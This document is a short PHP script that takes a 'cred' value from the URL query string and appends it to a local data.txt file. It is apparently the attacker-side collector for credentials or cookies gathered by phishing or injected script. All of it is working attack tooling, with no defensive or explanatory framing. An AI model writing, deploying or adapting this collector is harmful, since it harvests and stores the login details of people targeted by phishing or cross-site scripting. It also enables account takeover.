<?php
if(isset($_GET['cred']))
{

	$userDetails= "credintoals : " .$_GET['cred'] . '<br>' ;

	$fh = fopen("data.txt" ,"a+");
	fwrite($fh, $userDetails);
	fclose($fh);


}


?>
